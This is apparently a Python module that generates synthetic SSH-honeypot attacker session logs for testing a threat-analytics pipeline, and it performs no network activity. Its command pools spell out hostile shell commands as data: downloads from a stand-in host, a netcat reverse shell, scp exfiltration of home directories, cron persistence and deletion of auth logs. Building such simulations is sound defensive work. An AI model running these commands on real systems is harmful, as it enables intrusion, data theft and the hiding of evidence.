"""
data_generator.py
------------------
Generates realistic SYNTHETIC attacker session logs for development,
testing and demoing ADAPT-X without needing real production honeypot
data. Sessions loosely mimic Cowrie/SSH honeypot telemetry: a sequence
of timestamped commands issued by a source IP during a session.

Three archetypes are simulated with distinct behavioral signatures:
  - "bot"        : fast, scripted, narrow command set, high volume
  - "script_kid" : noisy recon + a few canned exploit/download attempts
  - "operator"   : slower, deliberate, broader command diversity,
                   attempts persistence and data staging (APT-like)

This is purely a data-simulation utility for building/testing the
analytics pipeline -- it does not perform any network activity.
"""

from __future__ import annotations

import ipaddress
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Optional

# Command pools per behavioral stage (used to build realistic sequences).
# These are the *observed* commands a defender would see in a honeypot
# transcript -- not instructions for carrying out an attack.
STAGE_COMMANDS = {
    "recon": ["whoami", "uname -a", "id", "cat /etc/passwd", "ifconfig",
              "netstat -an", "ps aux", "df -h", "cat /proc/cpuinfo"],
    "delivery": ["wget http://198.51.100.4/payload.sh", "curl -O http://198.51.100.4/x.bin",
                 "tftp -g 198.51.100.4 -r drop.elf"],
    "exploitation": ["chmod +x payload.sh", "./payload.sh", "python3 exploit.py",
                      "echo test > /tmp/poc"],
    "installation": ["crontab -l", "crontab -e", "useradd svc_updater",
                      "systemctl enable fakeservice", "echo '* * * * * /tmp/x' >> /etc/crontab"],
    "c2": ["nc -e /bin/sh 198.51.100.4 4444", "curl -s http://198.51.100.4/beacon",
           "ssh -R 4444:localhost:22 relay@198.51.100.4"],
    "actions_on_objective": ["tar -czf /tmp/loot.tar.gz /home", "scp /tmp/loot.tar.gz drop@198.51.100.4:",
                              "rm -rf /var/log/auth.log", "history -c"],
}

ARCHETYPE_STAGE_WEIGHTS = {
    "bot": {"recon": 0.5, "delivery": 0.3, "exploitation": 0.15, "installation": 0.05,
            "c2": 0.0, "actions_on_objective": 0.0},
    "script_kid": {"recon": 0.35, "delivery": 0.25, "exploitation": 0.25, "installation": 0.1,
                   "c2": 0.05, "actions_on_objective": 0.0},
    "operator": {"recon": 0.2, "delivery": 0.15, "exploitation": 0.15, "installation": 0.2,
                 "c2": 0.15, "actions_on_objective": 0.15},
}

ARCHETYPE_TIMING = {
    # mean seconds between commands, stdev
    "bot": (0.8, 0.3),
    "script_kid": (4.0, 2.5),
    "operator": (25.0, 15.0),
}

ARCHETYPE_SESSION_LEN = {
    "bot": (5, 12),
    "script_kid": (8, 20),
    "operator": (15, 40),
}

ARCHETYPE_SUCCESS_RATE = {
    "bot": 0.3,
    "script_kid": 0.5,
    "operator": 0.75,
}


@dataclass
class Session:
    session_id: str
    src_ip: str
    archetype: str
    start_time: datetime
    events: list = field(default_factory=list)  # list of dicts: {ts, command, stage, success}


def _random_ip() -> str:
    # Avoid reserved/private ranges for realism; this is synthetic data only.
    while True:
        ip = ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF))
        if ip.is_global:
            return str(ip)


def _sample_stage(archetype: str) -> str:
    weights = ARCHETYPE_STAGE_WEIGHTS[archetype]
    stages, probs = zip(*weights.items())
    return random.choices(stages, weights=probs, k=1)[0]


def generate_session(archetype: str, start_time: Optional[datetime] = None,
                      src_ip: Optional[str] = None, session_id: Optional[str] = None) -> Session:
    if start_time is None:
        start_time = datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 60 * 24 * 7))
    if src_ip is None:
        src_ip = _random_ip()
    if session_id is None:
        session_id = f"sess-{random.randint(100000, 999999)}"

    lo, hi = ARCHETYPE_SESSION_LEN[archetype]
    n_events = random.randint(lo, hi)
    mean_gap, std_gap = ARCHETYPE_TIMING[archetype]
    success_rate = ARCHETYPE_SUCCESS_RATE[archetype]

    sess = Session(session_id=session_id, src_ip=src_ip, archetype=archetype, start_time=start_time)
    t = start_time
    for _ in range(n_events):
        gap = max(0.05, random.gauss(mean_gap, std_gap))
        t = t + timedelta(seconds=gap)
        stage = _sample_stage(archetype)
        command = random.choice(STAGE_COMMANDS[stage])
        success = random.random() < success_rate
        sess.events.append({
            "ts": t.isoformat(),
            "command": command,
            "stage": stage,
            "success": success,
        })
    return sess


def generate_dataset(n_sessions: int = 150, seed: Optional[int] = 42) -> list[Session]:
    """Generate a mixed population of attacker sessions across archetypes."""
    if seed is not None:
        random.seed(seed)
    archetypes = ["bot", "script_kid", "operator"]
    weights = [0.55, 0.30, 0.15]  # bots are most common in the wild
    sessions = []
    for i in range(n_sessions):
        archetype = random.choices(archetypes, weights=weights, k=1)[0]
        # Some attackers return across multiple sessions (same IP)
        reuse_ip = random.random() < 0.25 and sessions
        src_ip = random.choice(sessions).src_ip if reuse_ip else None
        sessions.append(generate_session(archetype, src_ip=src_ip))
    return sessions


def sessions_to_records(sessions: list[Session]) -> list[dict]:
    """Flatten sessions into per-event records (rows), suitable for a DataFrame."""
    records = []
    for s in sessions:
        for ev in s.events:
            records.append({
                "session_id": s.session_id,
                "src_ip": s.src_ip,
                "true_archetype": s.archetype,  # ground truth, kept ONLY for evaluation/demo
                **ev,
            })
    return records
